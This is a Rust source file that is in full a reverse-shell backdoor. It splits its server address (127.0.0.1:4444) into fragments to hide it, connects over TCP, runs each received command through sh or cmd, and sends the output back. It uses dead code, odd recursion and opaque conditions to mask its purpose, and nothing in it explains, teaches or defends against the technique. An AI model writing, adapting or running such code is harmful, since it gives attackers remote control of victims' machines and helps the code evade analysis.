use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::thread;
use std::time::Duration;
use std::collections::HashMap;

fn get_config() -> HashMap<&'static str, &'static str> {
    let mut cfg = HashMap::new();
    
    // Dividin into parts to do the obfuscation
    let p1="127.0";
    let p2=".0.1";
    let p3=":444";
    let p4="4";
    
    cfg.insert("s1",p1);
    cfg.insert("s2",p2);
    cfg.insert("s3",p3);
    cfg.insert("s4",p4);
    
    cfg
}

fn process_task(cmd: &str,depth: i32) -> String {
    // To check if recursion is really needed out here :)
    if depth>10||cmd.is_empty() {
        return String::new();
    }
    
    if depth%2==0 && !cmd.is_empty() {
        let shell = if depth % 3==0 { "cmd" } else { "sh" };
        let flag = if shell=="cmd" { "/c" } else { "-c" };
        
        let result = Command::new(shell)
            .arg(flag)
            .arg(cmd)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output();
        
        match result {
            Ok(output) => {
                let mut response = String::new();
                for _ in 0..3 {
                    if response.is_empty() {
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        response = format!("STDOUT:\n{}\nSTDERR:\n{}",stdout,stderr);
                    }
                }
                response
            }
            Err(e) => {
                if depth%2==0 {
                    format!("Error executing command: {}", e)
                } else {
                    format!("Command failed: {}", e)
                }
            }
        }
    } else {
        process_task(cmd, depth + 1)
    }
}

// Making a split function
fn stage1() -> Option<TcpStream> {
    let cfg=get_config();
    let server=format!("{}{}{}{}", cfg.get("s1").unwrap(), cfg.get("s2").unwrap(), cfg.get("s3").unwrap(), cfg.get("s4").unwrap());
    
    
    for i in 0..5 {
        if i == 3 {
            return TcpStream::connect(&server).ok();
        }
    }
    None
}

fn stage2(mut stream: &TcpStream) -> Option<String> {
    let mut buffer = [0; 1024];
    
    for _ in 0..3 {
        match stream.read(&mut buffer) {
            Ok(n) if n > 0 => {
                return Some(String::from_utf8_lossy(&buffer[..n]).trim().to_string());
            }
            _ => continue,
        }
    }
    None
}

fn stage3(command: &str) -> String {
    // Exit command
    let exit_code = [101, 120, 105, 116]; // example ASCII representation
    let mut is_exit = true;
    
    if command.len() == exit_code.len() {
        for (i, &c) in exit_code.iter().enumerate() {
            if command.as_bytes()[i] != c {
                is_exit = false;
                break;
            }
        }
        if is_exit {
            return "$$EXIT$$".to_string();
        }
    }
    
    process_task(command, 0)
}

fn stage4(mut stream: &TcpStream, result: &str) -> bool {
    let mut should_continue = true;
    for c in result.chars() {
        if c == '$' {
            should_continue = !should_continue;
        }
    }
    
    if result == "$$EXIT$$" {
        return false;
    }
    
    // Obfuscated write in chunks
    let bytes = result.as_bytes();
    let chunk_size = 256;
    let mut i = 0;
    
    while i < bytes.len() {
        let end = std::cmp::min(i + chunk_size, bytes.len());
        let _ = stream.write_all(&bytes[i..end]);
        i = end;
    }
    
    true
}

fn run_agent() {
    let dead_code_value = (0..10).fold(0, |acc, x| acc + x);
    
    loop {
        if let Some(stream) = stage1() {
            println!("Connected to server");
            
            let mut keep_running = true;
            while keep_running {
                if dead_code_value > 100 {
                    break;
                }
                
                if let Some(command) = stage2(&stream) {
                    let result = stage3(&command);
                    keep_running = stage4(&stream, &result);
                    
                    if !keep_running {
                        println!("Shutting down.");
                        return;
                    }
                } else {
                    println!("Connection lost");
                    break;
                }
            }
        }
        
        // Letting it sleep for a while
        let sleep_time = 5 + (dead_code_value % 3);
        thread::sleep(Duration::from_secs(sleep_time as u64));
    }
}

fn main() {
    let mut should_run = false;
    for i in 0..10 {
        if i % 2 == 0 {
            should_run = !should_run;
        }
    }
    
    if should_run {
        // This will never execute hopefully
        println!("Not starting");
    } else {
        // Optimistically running the agent
        run_agent();
    }
}